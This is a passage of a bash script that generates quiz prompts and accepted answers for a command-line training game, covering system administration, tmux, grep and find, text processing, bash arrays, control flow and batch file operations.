  questions+=("Make ${dir}/ and contents readable by all|chmod -R a+r ${dir}/")
  questions+=("Remove write permission for everyone in ${W}${txt}${C}|chmod a-w ${txt}")
  questions+=("Set exact read-only (r--r--r--) in ${W}${txt}${C}|chmod 444 ${txt}")
  questions+=("Copy permissions from ${cfg} to ${txt}|chmod --reference=${cfg} ${txt}")

  # === COMPOUND: Uses grep (L3), pipes (L3), logic (L6) ===
  questions+=("If ${W}${log}${C} exists, show lines with ${Y}${searchterm}${C}§[[ -f ${log} ]] && grep ${searchterm} ${log}")
  questions+=("Copy ${W}${cfg}${C} to backup and verify§cp ${cfg} ${cfg}.bak && diff ${cfg} ${cfg}.bak")
  questions+=("Create ${W}${dir}${C}, then list its contents|mkdir -p ${dir} && ls -la ${dir}")
  questions+=("Count ${Y}${searchterm}${C} in ${W}${log}${C} if exists§[[ -f ${log} ]] && grep -c ${searchterm} ${log}")
  questions+=("Extract ${W}${gz_archive}${C} and list contents§tar xzf ${gz_archive} && ls -la")
  questions+=("Copy ${W}${txt}${C} to ${W}${dir}${C}/ and echo done|cp ${txt} ${dir}/ && echo done")

  printf '%s\n' "${questions[@]}"
}

# Level 14: System Admin
gen_level14() {
  eval "local questions=() $_QV"; _ctx
  _fphrase git vim tmux htop curl wget rsync jq; local pkg=$REPLY
  _fphrase ls cat grep find sort awk sed head; local sysbin=$REPLY

  # Network diagnostics
  questions+=("Ping ${ip} 5 times|ping -c 5 ${ip}")
  questions+=("Ping ${ip} continuously|ping ${ip}")
  questions+=("Trace route to ${ip} (use ${Y}traceroute${C})|traceroute ${ip}|tracepath ${ip}")
  questions+=("DNS lookup for ${host}|dig ${host}|nslookup ${host}|host ${host}")
  questions+=("Reverse DNS lookup for ${ip}|dig -x ${ip}|host ${ip}")
  questions+=("Check if port ${port} is open on ${ip}|nc -zv ${ip} ${port}")
  questions+=("Show listening ports|ss -tlnp|netstat -tlnp")
  questions+=("Show all network connections|ss -tunapl|netstat -tunapl")
  questions+=("Show routing table|ip route|ip r")
  questions+=("Show network interfaces|ip addr|ip a")

  # System monitoring
  questions+=("Show disk space usage|df -h")
  questions+=("Show memory usage|free -h")
  questions+=("Show system uptime|uptime")
  questions+=("Show system info|uname -a")
  questions+=("Show CPU info|lscpu|cat /proc/cpuinfo")
  questions+=("Show kernel messages|dmesg|dmesg -T|journalctl -k")
  questions+=("Interactive process viewer|top|htop|btop")
  questions+=("Show top 10 memory-hungry processes§ps aux --sort=-%mem | head -11")
  questions+=("Show process tree|pstree|ps auxf")

  # Service management (systemd)
  questions+=("Check status of ${svc}|systemctl status ${svc}")
  questions+=("Start ${svc}|systemctl start ${svc}")
  questions+=("Stop ${svc}|systemctl stop ${svc}")
  questions+=("Restart ${svc}|systemctl restart ${svc}")
  questions+=("Enable ${svc} at boot|systemctl enable ${svc}")
  questions+=("Disable ${svc} at boot|systemctl disable ${svc}")
  questions+=("List running services|systemctl list-units --type=service --state=running")
  questions+=("Show services that failed to start|systemctl --failed")
  questions+=("Reload systemd daemon|systemctl daemon-reload")
  questions+=("Show ${svc} logs|journalctl -u ${svc}")
  questions+=("Follow ${svc} logs|journalctl -fu ${svc}")
  questions+=("Show logs since boot|journalctl -b")
  questions+=("Show last 100 log lines|journalctl -n 100")

  # User/permission management
  questions+=("Run ${script} as root|sudo ${script}")
  questions+=("Switch to root shell|sudo -i|su -|sudo su|sudo -s|sudo bash")
  questions+=("Switch to user ${user}|su - ${user}")
  questions+=("Add user ${user}|useradd -m ${user}|sudo useradd -m ${user}")
  questions+=("Delete user ${user}|userdel -r ${user}|sudo userdel -r ${user}")
  questions+=("Change password for ${user}|passwd ${user}|sudo passwd ${user}")
  questions+=("Add ${user} to group wheel|usermod -aG wheel ${user}")
  questions+=("List groups for ${user}|groups ${user}|id ${user}")
  questions+=("Change owner of ${txt} to ${user}|chown ${user} ${txt}")
  questions+=("Change owner and group of ${txt} to ${user}|chown ${user}:${user} ${txt}")
  questions+=("Change owner of ${dir}/ recursively to ${user}|chown -R ${user}:${user} ${dir}/")
  questions+=("Show current user|whoami")
  questions+=("Show user id info|id")

  # Package management (distro-agnostic patterns)
  questions+=("Install ${pkg} (Debian/Ubuntu)|apt install ${pkg}|sudo apt install ${pkg}")
  questions+=("Install ${pkg} (Fedora/RHEL)|dnf install ${pkg}|sudo dnf install ${pkg}")
  questions+=("Upgrade all packages (Debian/Ubuntu)|apt upgrade|sudo apt upgrade")
  questions+=("Upgrade all packages (Fedora/RHEL)|dnf upgrade|sudo dnf upgrade")
  questions+=("Search for package ${term} (Debian)|apt search ${term}|apt-cache search ${term}")
  questions+=("Search for package ${term} (Fedora)|dnf search ${term}")

  # Security audit
  questions+=("Run full system security audit|lynis audit system")
  questions+=("Lynis scan specific category|lynis audit system --tests-from-group networking")

  printf '%s\n' "${questions[@]}"
}
# Level 15: Multiplexers (tmux)
gen_level15() {
  eval "local questions=() $_QV"; _ctx

  # Session management (CLI)
  questions+=("Start new tmux session|tmux|tmux new")
  questions+=("Start tmux session named 'work'|tmux new -s work|tmux new-session -s work")
  questions+=("List sessions|tmux ls|tmux list-sessions")
  questions+=("Attach to last session|tmux attach|tmux a")
  questions+=("Attach to session 'work'|tmux attach -t work|tmux a -t work")
  questions+=("Kill session 'work'|tmux kill-session -t work")
  questions+=("Kill tmux server (all sessions)|tmux kill-server")
  questions+=("Rename session 'work' to 'dev'|tmux rename-session -t work dev")

  # Window management (CLI)
  questions+=("Create new window in session|tmux new-window|tmux neww")
  questions+=("Create named window 'logs'|tmux new-window -n logs")
  questions+=("Split pane left/right|tmux split-window -h")
  questions+=("Split pane top/bottom|tmux split-window -v")
  questions+=("List all windows|tmux list-windows")
  questions+=("Select window 0|tmux select-window -t 0")
  questions+=("Swap current window with window 0|tmux swap-window -t 0")

  # Pane management (CLI)
  questions+=("List all panes|tmux list-panes")
  questions+=("Select pane to the right|tmux select-pane -R")
  questions+=("Select pane below|tmux select-pane -D")
  questions+=("Zoom/unzoom pane|tmux resize-pane -Z")
  questions+=("Kill current pane|tmux kill-pane")
  questions+=("Resize pane down by 10 lines|tmux resize-pane -D 10")
  questions+=("Resize pane right by 20 columns|tmux resize-pane -R 20")
  questions+=("Swap with next pane|tmux swap-pane -D")

  # Scripting / automation (the real power)
  questions+=("Send keys to session 'work'|tmux send-keys -t work 'ls -la' Enter")
  questions+=("Capture pane output to stdout|tmux capture-pane -p")
  questions+=("Save pane output to file§tmux capture-pane -p > output.txt")
  questions+=("Run command in new window§tmux new-window 'htop'")
  questions+=("Create session with command§tmux new -s monitor 'htop'")
  questions+=("Pipe pane output to log file|tmux pipe-pane -t work 'cat >> session.log'")

  # Essential keybindings (recall, not drills)
  questions+=("Keybinding: detach from session|Ctrl+b d")
  questions+=("Keybinding: split pane left/right|Ctrl+b %")
  questions+=("Keybinding: split pane top/bottom|Ctrl+b \"")
  questions+=("Keybinding: cycle to next pane|Ctrl+b o")
  questions+=("Keybinding: toggle pane zoom|Ctrl+b z")
  questions+=("Keybinding: enter copy mode|Ctrl+b [")
  questions+=("Keybinding: show all keybindings|Ctrl+b ?")

  printf '%s\n' "${questions[@]}"
}

# Level 16: Text Search (grep, rg)
gen_level16() {
  eval "local questions=() $_QV"; _ctx
  _frnum 1 10; local ctx=$REPLY; _frnum 2 5; local ctx2=$REPLY

  # Basic grep - with flag order alternatives
  questions+=("Search for '${term}' recursively|grep -r ${term}|grep -r ${term} .|rg ${term}")
  questions+=("Case-insensitive search for '${term}'|grep -ri ${term}|grep -ir ${term}|rg -i ${term}")
  questions+=("Search '${term}' with line numbers|grep -rn ${term}|grep -nr ${term}|rg -n ${term}")
  questions+=("Count '${term}' matches in ${log}|grep -c ${term} ${log}|rg -c ${term} ${log}")
  questions+=("Search '${term}' with ${ctx} lines context in ${log}|grep -C ${ctx} ${term} ${log}|rg -C ${ctx} ${term} ${log}")
  questions+=("Show ${ctx2} lines before each '${term}' match in ${log}|grep -B ${ctx2} ${term} ${log}|rg -B ${ctx2} ${term} ${log}")
  questions+=("Show ${ctx} lines after each '${term}' match in ${log}|grep -A ${ctx} ${term} ${log}|rg -A ${ctx} ${term} ${log}")

  # Filtering - more variations
  questions+=("$(_phrase "List" "Show") only filenames containing '${term}'|grep -rl ${term}|grep -lr ${term}|rg -l ${term}")
  questions+=("Lines WITHOUT '${term}' in ${log}|grep -v ${term} ${log}|rg -v ${term} ${log}")
  questions+=("Search '${term}' in .${ext} files only|grep -r --include='*.${ext}' ${term}|rg -g '*.${ext}' ${term}")
  questions+=("Search '${term}' in .${ext} and .${ext2} files|grep -r --include='*.${ext}' --include='*.${ext2}' ${term}|rg -g '*.${ext}' -g '*.${ext2}' ${term}")
  questions+=("Search '${term}' excluding .git directory|grep -r --exclude-dir=.git ${term}|rg ${term} -g '!.git'")
  questions+=("Search '${term}' excluding ${dir}/ directory|grep -r --exclude-dir=${dir} ${term}|rg ${term} -g '!${dir}'")
  questions+=("Search '${term}' in ${dir}/ only|grep -r ${term} ${dir}/|rg ${term} ${dir}/")

  # Regex patterns - more variety
  questions+=("Find lines starting with '${term}'|grep -r '^${term}'|rg '^${term}'")
  questions+=("Find lines ending with '${term}'|grep -r '${term}\$'|rg '${term}\$'")
  questions+=("Find lines containing ONLY '${term}'|grep -rx '${term}'|rg -x '${term}'")
  questions+=("Find phone pattern XXX-XXX-XXXX|grep -rE '[0-9]{3}-[0-9]{3}-[0-9]{4}'|rg '\\d{3}-\\d{3}-\\d{4}'")
  questions+=("Find IP addresses in ${log}|grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log}|rg -o '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log}")
  questions+=("Find email addresses|grep -rE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}'|rg '[\\w.+-]+@[\\w.-]+\\.[a-z]{2,}'")
  questions+=("Find URLs in ${log}|grep -oE 'https?://[^ ]+' ${log}|rg -o 'https?://\\S+' ${log}")
  questions+=("Find lines with numbers in ${W}${txt}${C}|grep -E '[0-9]+' ${txt}|rg '\\d+' ${txt}")
  questions+=("Find hex values (0x...) in ${W}${log}${C}|grep -E '0x[0-9a-fA-F]+' ${log}|rg '0x[0-9a-fA-F]+' ${log}")

  # Literal search
  questions+=("Literal search 'func()' (no regex) in ${W}${txt}${C}|grep -F 'func()' ${txt}|rg -F 'func()' ${txt}")
  questions+=("Search for literal '[ERROR]' in ${log}|grep -F '[ERROR]' ${log}|rg -F '[ERROR]' ${log}")
  questions+=("Search for literal '\$HOME' in ${txt}|grep -F '\$HOME' ${txt}|rg -F '\$HOME' ${txt}")

  # Word boundaries
  questions+=("Match whole word '${term}' only|grep -rw ${term}|grep -wr ${term}|rg -w ${term}")

  # Multiple patterns
  questions+=("Find lines with '${term}' OR '${term2}'§grep -rE '${term}|${term2}'§rg '${term}|${term2}'")
  questions+=("Find lines with '${term}', '${term2}', OR '${term3}'§grep -rE '${term}|${term2}|${term3}'§rg '${term}|${term2}|${term3}'")
  questions+=("Find lines with both '${term}' AND '${term2}'§grep -r ${term} | grep ${term2}§rg ${term} | rg ${term2}")
  questions+=("Search for pattern from file patterns.txt|grep -rf patterns.txt|rg -f patterns.txt")

  # Output control
  questions+=("Show only matched text, not whole line in ${W}${log}${C}|grep -o ${term} ${log}|rg -o ${term} ${log}")
  questions+=("Quiet mode (exit code only, no output) in ${W}${log}${C}|grep -q ${term} ${log}|rg -q ${term} ${log}")

  # === COMPOUND: Uses pipes (L3), head/tail (L2), sort/uniq (L16), logic (L6) ===
  questions+=("Find ${Y}${term}${C} in ${W}${log}${C}, show first ${ctx} matches§grep ${term} ${log} | head -${ctx}")
  questions+=("Count ${Y}${term}${C} lines and show sorted unique in ${W}${log}${C}§grep ${term} ${log} | sort | uniq -c | sort -rn")
  questions+=("If ${Y}${term}${C} found, count matches; else echo 'none' in ${W}${log}${C}§grep -q ${term} ${log} && grep -c ${term} ${log} || echo 'none'")
  questions+=("Search ${Y}${term}${C} in all .${ext} files, save to results.txt§grep -r ${term} --include='*.${ext}' > results.txt")
  questions+=("Find ${Y}${term}${C} lines, extract IPs, count unique in ${W}${log}${C}§grep ${term} ${log} | grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' | sort -u | wc -l")

  printf '%s\n' "${questions[@]}"
}

# Level 17: File Finding (find, fd)
gen_level17() {
  eval "local questions=() $_QV"; _ctx

  # By name
  questions+=("Find all .${ext} files|find . -name '*.${ext}'|fd -e ${ext}")
  questions+=("Find files named exactly 'config'|find . -name 'config'|fd -g 'config'")
  questions+=("Find 'config' files (case-insensitive)|find . -iname '*config*'|fd -i config")
  questions+=("Find files matching '*test*' pattern|find . -name '*test*'|fd test")

  # By size
  questions+=("Find files larger than ${size}|find . -size +${size}|fd -S +${size}")
  questions+=("Find files smaller than ${size}|find . -size -${size}|fd -S -${size}")
  questions+=("Find empty files|find . -type f -empty")

  # By time
  questions+=("Find files modified in last ${time} minutes|find . -mmin -${time}|fd --changed-within ${time}m")
  questions+=("Find files NOT modified in last 7 days|find . -not -mtime -7|find . ! -mtime -7|fd --changed-before 7d")
  questions+=("Find files modified in last hour|find . -mmin -60|fd --changed-within 1h")

  # By type
  questions+=("Find directories only|find . -type d|fd -t d")
  questions+=("Find regular files only|find . -type f|fd -t f")
  questions+=("Find symlinks only|find . -type l|fd -t l")
  questions+=("Find executable files|find . -type f -executable|fd -t x")

  # Hidden and exclusions
  questions+=("Find all files including hidden (fd excludes hidden by default)|fd -H")
  questions+=("Find all, excluding .git directory|find . -not -path './.git/*'|fd -E .git")
  questions+=("Find .${ext} files, excluding ${dir}/|find . -name '*.${ext}' -not -path './${dir}/*'|fd -e ${ext} -E ${dir}")
  questions+=("Find files excluding multiple dirs|find . -not -path './node_modules/*' -not -path './.git/*'|fd -E node_modules -E .git")

  # Path matching
  questions+=("Find files in paths matching */${dir}/*|find . -path '*/${dir}/*'|fd -p ${dir}/")
  questions+=("Find test files in src directory|find . -path '*/src/*' -name '*test*'|fd -p 'src/.*test'")

  # Max depth
  questions+=("Find .${ext} files, max 2 levels deep|find . -maxdepth 2 -name '*.${ext}'|fd -e ${ext} -d 2")
  questions+=("Find only in current dir (no recursion)|find . -maxdepth 1 -type f|fd -d 1 -t f")

  # === COMPOUND: Uses grep (L14), pipes (L3), wc (L2), logic (L6) ===
  questions+=("Find .${ext} files containing '${term}'§find . -name '*.${ext}' -exec grep -l ${term} {} \\;§fd -e ${ext} -x grep -l ${term} {}")
  questions+=("Find .${ext} files, count total lines§find . -name '*.${ext}' -exec wc -l {} + | tail -1")
  questions+=("Find large files (>${size}), show sizes sorted§find . -size +${size} -exec du -h {} \\; | sort -rh")
  questions+=("Find .${ext} files modified today, grep for '${term}'§find . -name '*.${ext}' -mtime 0 -exec grep -l ${term} {} \\;")
  questions+=("Find empty files and delete them§find . -type f -empty -print -delete")

  printf '%s\n' "${questions[@]}"
}

# Level 18: Data Processing
gen_level18() {
  eval "local questions=() $_QV"; _ctx
  _fpick PROCS; local proc2=$REPLY; _frnum 1 5; local col2=$REPLY; local col3=$((col % 5 + 1)); _frnum 10 80; local chars=$REPLY; _frnum 1 25; local thresh=$REPLY
  ((col3 < col)) && { local _t=$col; col=$col3; col3=$_t; }  # ensure col <= col3 for ranges
  ((n > n2)) && { local t=$n; n=$n2; n2=$t; }

  # Sorting
  questions+=("Sort ${txt} alphabetically|sort ${txt}")
  questions+=("Sort ${txt} in reverse|sort -r ${txt}")
  questions+=("Sort ${txt} numerically|sort -n ${txt}")
  questions+=("Sort ${txt} numerically descending|sort -rn ${txt}|sort -nr ${txt}")
  questions+=("Sort and remove duplicates in ${W}${txt}${C}|sort -u ${txt}")
  questions+=("Sort ${csv} by column ${col}|sort -t',' -k${col} ${csv}")
  questions+=("Sort ${csv} by column ${col} numerically|sort -t',' -k${col}n ${csv}|sort -t',' -nk${col} ${csv}")
  questions+=("Sort ${csv} by column ${col} descending|sort -t',' -k${col}rn ${csv}|sort -t',' -rnk${col} ${csv}")
  questions+=("Sort ${txt} by human-readable sizes (1K, 2M, 3G)|sort -h ${txt}")
  questions+=("Sort ${txt} case-insensitively|sort -f ${txt}|sort --ignore-case ${txt}")
  questions+=("Sort ${csv} by column ${col} then ${col2}|sort -t',' -k${col},${col} -k${col2},${col2} ${csv}")

  # Uniqueness
  questions+=("Remove adjacent duplicate lines in ${W}${txt}${C}|uniq ${txt}")
  questions+=("Count occurrences of each unique line in ${W}${txt}${C}§sort ${txt} | uniq -c")
  questions+=("Show only duplicate lines in ${W}${txt}${C}§sort ${txt} | uniq -d")
  questions+=("Show only unique lines (appear once) in ${W}${txt}${C}§sort ${txt} | uniq -u")
  questions+=("Count unique lines in ${txt}§sort ${txt} | uniq | wc -l§sort -u ${txt} | wc -l")
  questions+=("Show all duplicates (repeated lines) in ${W}${txt}${C}§sort ${txt} | uniq -D")

  # Cutting columns
  questions+=("Extract column ${col} from ${csv}|cut -d',' -f${col} ${csv}")
  questions+=("Extract columns ${col} and ${col3} from ${csv}|cut -d',' -f${col},${col3} ${csv}")
  questions+=("Extract columns ${col} through ${col3} in ${W}${csv}${C}|cut -d',' -f${col}-${col3} ${csv}")
  questions+=("Extract first ${chars} characters of each line in ${W}${txt}${C}|cut -c1-${chars} ${txt}")
  questions+=("Extract from character ${chars} to end of line in ${W}${txt}${C}|cut -c${chars}- ${txt}")
  questions+=("Extract column ${col} from colon-separated file|cut -d':' -f${col} /etc/passwd")
  questions+=("Extract all but column ${col} in ${W}${csv}${C}|cut -d',' --complement -f${col} ${csv}")
  questions+=("Extract using tab delimiter in ${W}${txt}${C}|cut -f${col} ${txt}")

  # Basic awk
  questions+=("Print first column of ${txt}|awk '{print \$1}' ${txt}")
  questions+=("Print last column of each line in ${W}${txt}${C}|awk '{print \$NF}' ${txt}")
  questions+=("Print columns ${col} and ${col2} in ${W}${txt}${C}|awk '{print \$${col}, \$${col2}}' ${txt}")
  questions+=("Print lines longer than ${chars} chars in ${W}${txt}${C}|awk 'length > ${chars}' ${txt}")
  questions+=("Print line numbers with content in ${W}${txt}${C}|awk '{print NR, \$0}' ${txt}")
  local _statuses=(active inactive pending); _fpick _statuses; local _status=$REPLY
  # data.csv has numeric id in $1 and status in $4; use it for type-specific queries
  questions+=("Sum column 1 of data.csv (skip header)|awk -F',' 'NR>1{sum+=\$1} END {print sum}' data.csv")
  questions+=("Print lines where column 1 > ${thresh} (skip header)|awk -F',' 'NR>1 && \$1 > ${thresh}' data.csv")
  questions+=("Print lines where column 4 equals \"${_status}\" in data.csv|awk -F',' '\$4 == \"${_status}\"' data.csv")
  questions+=("Print every ${col}th line in ${W}${txt}${C}|awk 'NR % ${col} == 0' ${txt}")
  questions+=("Print lines ${n} through ${n2} in ${W}${txt}${C}|awk 'NR>=${n} && NR<=${n2}' ${txt}|sed -n '${n},${n2}p' ${txt}")
  questions+=("Average of column 1 (skip header)|awk -F',' 'NR>1{sum+=\$1; count++} END {print sum/count}' data.csv")
  questions+=("Maximum value in column 1 (skip header)|awk -F',' 'NR==2{max=\$1} NR>1 && \$1>max{max=\$1} END{print max}' data.csv")
  questions+=("Swap columns 1 and 2 in ${W}${txt}${C} output|awk '{print \$2, \$1}' ${txt}")
  questions+=("Print unique values from column ${col} (skip header) in ${W}${csv}${C}|awk -F',' 'NR>1 && !seen[\$${col}]++ {print \$${col}}' ${csv}")
  questions+=("Count records by column ${col} value in ${W}${csv}${C}|awk -F',' 'NR>1{count[\$${col}]++} END {for(k in count) print k, count[k]}' ${csv}")

  # Field manipulation with tr
  questions+=("Replace spaces with tabs in ${W}${txt}${C}|tr ' ' '\\t' < ${txt}")
  questions+=("Delete all digits from ${txt}|tr -d '0-9' < ${txt}")
  questions+=("Squeeze multiple spaces to single in ${W}${txt}${C}|tr -s ' ' < ${txt}")
  questions+=("Convert to lowercase in ${W}${txt}${C}|tr 'A-Z' 'a-z' < ${txt}|tr '[:upper:]' '[:lower:]' < ${txt}")
  questions+=("Convert to uppercase in ${W}${txt}${C}|tr 'a-z' 'A-Z' < ${txt}|tr '[:lower:]' '[:upper:]' < ${txt}")
  questions+=("Delete all whitespace in ${W}${txt}${C}|tr -d '[:space:]' < ${txt}")
  questions+=("Replace newlines with spaces in ${W}${txt}${C}|tr '\\n' ' ' < ${txt}")
  questions+=("Convert tabs to spaces in ${W}${txt}${C}|tr '\\t' ' ' < ${txt}")

  # Useful pipes - dynamic counts
  questions+=("Top ${n} most common lines in ${log}§sort ${log} | uniq -c | sort -rn | head -${n}§sort ${log} | uniq -c | sort -nr | head -${n}")
  questions+=("Count unique values in column ${col} in ${W}${csv}${C}§cut -d',' -f${col} ${csv} | sort | uniq -c")
  questions+=("Extract and count unique IPs from ${log}§grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log} | sort | uniq -c | sort -rn")
  questions+=("Most common words in ${txt}§tr -s ' ' '\\n' < ${txt} | sort | uniq -c | sort -rn | head")
  questions+=("Lines appearing in both ${txt} and ${txt2}|comm -12 <(sort ${txt}) <(sort ${txt2})")
  questions+=("Lines only in ${txt}, not ${txt2}|comm -23 <(sort ${txt}) <(sort ${txt2})")

  printf '%s\n' "${questions[@]}"
}

# Level 19: String & Arrays
gen_level19() {
  eval "local questions=() $_QV"; _ctx

  # Parameter expansion - removal (practical examples)
  questions+=("Extract filename from /path/to/${txt} (stored in \$path)|echo \${path##*/}|basename \$path")
  questions+=("Get parent directory from \$fullpath|echo \${fullpath%/*}")
  questions+=("Get extension from ${cfg} (stored in \$file)|echo \${file##*.}")
  questions+=("Remove extension from ${log} (stored in \$file)|echo \${file%.*}")
  questions+=("Create backup of ${W}${cfg}${C} with .bak extension|cp ${cfg}{,.bak}")
  questions+=("Strip leading 'v' from version string \$ver (e.g., v1.2.3)|echo \${ver#v}")
  questions+=("Remove protocol from URL \$url (e.g., https://)|echo \${url#*://}")
  questions+=("Get domain from \$url (e.g., ${Y}host.com/path/file${C}, no protocol)|echo \${url%%/*}")
  questions+=("Strip all leading directories from \$path|echo \${path##*/}")

  # Parameter expansion - substitution
  questions+=("Replace first 'old' with 'new' in \$var|echo \${var/old/new}")
  questions+=("Replace ALL 'old' with 'new' in \$var|echo \${var//old/new}")
  questions+=("Replace 'old' at START of \$var|echo \${var/#old/new}")
  questions+=("Replace 'old' at END of \$var|echo \${var/%old/new}")
  questions+=("Delete all spaces from \$var|echo \${var// /}")
  questions+=("Delete all digits from \$var|echo \${var//[0-9]/}")

  # Parameter expansion - substrings
  questions+=("Extract substring from position 5|echo \${var:5}")
  questions+=("Extract 3 chars starting at position 5|echo \${var:5:3}")
  questions+=("Get last 4 characters of \$var|echo \${var: -4}")
  questions+=("Get string length of \$var|echo \${#var}")

  # Parameter expansion - case
  questions+=("Convert \$var to lowercase|echo \${var,,}")
  questions+=("Convert \$var to uppercase|echo \${var^^}")
  questions+=("Capitalize first char of \$var|echo \${var^}")
  questions+=("Lowercase first char of \$var|echo \${var,}")

  # Parameter expansion - defaults
  questions+=("Use 'default' if \$var is unset|echo \${var:-default}")
  questions+=("Set \$var to 'default' if unset|echo \${var:=default}")
  questions+=("Error if \$var is unset|echo \${var:?error message}")
  questions+=("Use 'alt' if \$var IS set|echo \${var:+alt}")

  # Indexed arrays
  questions+=("Declare indexed array|declare -a arr")
  questions+=("Create array with values|arr=(one two three)")
  questions+=("Access first element|echo \${arr[0]}")
  questions+=("Access last element|echo \${arr[-1]}")
  questions+=("Get all array elements|echo \${arr[@]}")
  questions+=("Get array length|echo \${#arr[@]}")
  questions+=("Get array indices|echo \${!arr[@]}")
  questions+=("Append to array|arr+=(four)")
  questions+=("Delete array element at index 1|unset 'arr[1]'")
  questions+=("Slice array: elements 1-3|echo \${arr[@]:1:3}")

  # Associative arrays
  questions+=("Declare associative array|declare -A map")
  questions+=("Set associative array value|map[key]=value")
  questions+=("Create associative array inline|declare -A map=([k1]=v1 [k2]=v2)")
  questions+=("Get associative array value|echo \${map[key]}")
  questions+=("Get all keys of associative array|echo \${!map[@]}")
  questions+=("Get all values of associative array|echo \${map[@]}")
  questions+=("Check if key exists in array|[[ -v map[key] ]]")

  # Array operations
  questions+=("Loop over array elements|for x in \"\${arr[@]}\"; do echo \"\$x\"; done")
  questions+=("Loop with index|for i in \"\${!arr[@]}\"; do echo \"\$i: \${arr[\$i]}\"; done")
  questions+=("Join array with comma|(IFS=','; echo \"\${arr[*]}\")")
  questions+=("Read ${W}${txt}${C} lines into array|mapfile -t arr < ${txt}|readarray -t arr < ${txt}")
  questions+=("Read command output into array|mapfile -t arr < <(ls)")
  questions+=("Copy array|arr2=(\"\${arr[@]}\")")
  questions+=("Merge two arrays|merged=(\"\${arr1[@]}\" \"\${arr2[@]}\")")

  printf '%s\n' "${questions[@]}"
}

# Level 20: Control Flow & Functions
gen_level20() {
  eval "local questions=() $_QV"; _ctx

  # if/else
  questions+=("Basic if statement|if [[ condition ]]; then cmd; fi")
  questions+=("if/else statement|if [[ cond ]]; then cmd1; else cmd2; fi")
  questions+=("if/elif/else|if [[ c1 ]]; then cmd1; elif [[ c2 ]]; then cmd2; else cmd3; fi")
  questions+=("Test if ${W}${txt}${C} exists and display it|[[ -f ${txt} ]] && cat ${txt}")
  questions+=("Test if grep succeeds on ${W}${log}${C}|if grep -q error ${log}; then echo found; fi")
  questions+=("Negate condition in ${W}${txt}${C}|if ! [[ -f ${txt} ]]; then echo missing; fi")
  questions+=("Compound AND condition in ${W}${txt}${C}|if [[ -f ${txt} && -r ${txt} ]]; then cat ${txt}; fi")
  questions+=("Compound OR condition§if [[ -z \"\$var\" || \"\$var\" == \"default\" ]]; then echo empty; fi")

  # for loops (practical examples)
  questions+=("Process all .${ext} files in current dir|for f in *.${ext}; do echo \"Processing \$f\"; done")
  questions+=("Rename all .txt to .bak|for f in *.txt; do mv \"\$f\" \"\${f%.txt}.bak\"; done")
  questions+=("Retry curl until success (max ${n} tries)|for i in \$(seq 1 ${n}); do curl -s url && break; sleep 1; done")
  questions+=("Loop over servers and check SSH|for h in srv1 srv2 srv3; do ssh -o ConnectTimeout=2 \$h uptime; done")
  questions+=("Process numbered files file1 to file${n}|for i in \$(seq 1 ${n}); do cat file\$i; done")
  questions+=("C-style countdown from ${n}|for ((i=${n}; i>0; i--)); do echo \$i; done")
  questions+=("Loop over array elements|for item in \"\${arr[@]}\"; do echo \"\$item\"; done")
  questions+=("Loop over files in ${dir}/, skip dirs|for f in ${dir}/*; do [[ -f \"\$f\" ]] && echo \"\$f\"; done")

  # while loops
  questions+=("While loop basic|while [[ condition ]]; do cmd; done")
  questions+=("While read lines from ${W}${txt}${C}|while IFS= read -r line; do echo \"\$line\"; done < ${txt}")
  questions+=("While with counter|i=0; while ((i < ${n})); do echo \$i; ((i++)); done")
  questions+=("Infinite loop with break|while true; do cmd; [[ cond ]] && break; done")
  questions+=("While with continue, read from ${W}${txt}${C}|while read -r line; do [[ -z \"\$line\" ]] && continue; echo \"\$line\"; done < ${txt}")
  questions+=("Read command output line by line|while IFS= read -r line; do echo \"\$line\"; done < <(ls -la)")
  questions+=("Until ${W}${txt}${C} exists (opposite of while)|until [[ -f ${txt} ]]; do sleep 1; done")

  # case statements
  questions+=("Basic case statement|case \"\$var\" in a) echo A;; b) echo B;; *) echo other;; esac")
  questions+=("Case with multiple patterns|case \"\$ext\" in sh|bash) echo shell;; py) echo python;; *) echo other;; esac")
  questions+=("Case for yes/no input|case \"\$ans\" in [Yy]*) echo yes;; [Nn]*) echo no;; *) echo invalid;; esac")
  questions+=("Case with glob patterns|case \"\$file\" in *.txt) echo text;; *.sh) echo script;; esac")

  # functions
  questions+=("Define simple function|func() { echo hello; }")
  questions+=("Function with local variable|func() { local x=5; echo \$x; }")
  questions+=("Function with arguments|func() { echo \"arg1: \$1, arg2: \$2\"; }")
  questions+=("Function with return value|func() { return 0; }; func && echo success")
  questions+=("Function returning string via stdout|func() { echo result; }; var=\$(func)")
  questions+=("Function with all args|func() { echo \"all args: \$@\"; }")
  questions+=("Function with arg count|func() { echo \"got \$# args\"; }")
  questions+=("Check function exists|declare -F func &>/dev/null && echo exists")
  questions+=("Unset function|unset -f func")

  # trap and signals
  questions+=("Trap SIGINT (Ctrl+C)|trap 'echo caught' SIGINT")
  questions+=("Trap EXIT for cleanup|trap 'rm -f /tmp/lock' EXIT")
  questions+=("Trap multiple signals|trap 'cleanup' SIGINT SIGTERM EXIT")
  questions+=("Trap ERR for error handling|trap 'echo error at line \$LINENO' ERR")

  # error handling
  questions+=("Exit on any error|set -e")
  questions+=("Exit on undefined variable|set -u")
  questions+=("Fail on pipe error|set -o pipefail")
  questions+=("Strict mode combo|set -euo pipefail")
  questions+=("Check last command status|[[ \$? -ne 0 ]] && echo failed")
  questions+=("Run command, ignore failure§grep pattern file || true")
  questions+=("Die function|die() { echo \"\$1\" >&2; exit 1; }")

  # debugging
  questions+=("Enable debug mode (print commands)|set -x")
  questions+=("Disable debug mode|set +x")

  printf '%s\n' "${questions[@]}"
}

# Level 21: Batch Ops
gen_level21() {
  eval "local questions=() $_QV"; _ctx
  _fpick SERVICES; local svc2=$REPLY; _frnum 2 8; local parallel=$REPLY; _frnum 1 20; local linenum=$REPLY

  # find -exec - with flag alternatives
  questions+=("Run ls -l on each .${ext} file found|find . -name '*.${ext}' -exec ls -l {} \\;|fd -e ${ext} -x ls -l {}")
  questions+=("Count lines in each .${ext} file|find . -name '*.${ext}' -exec wc -l {} \\;|fd -e ${ext} -x wc -l {}")
  questions+=("Delete all .${ext2} files|find . -name '*.${ext2}' -delete|fd -e ${ext2} -x rm {}")
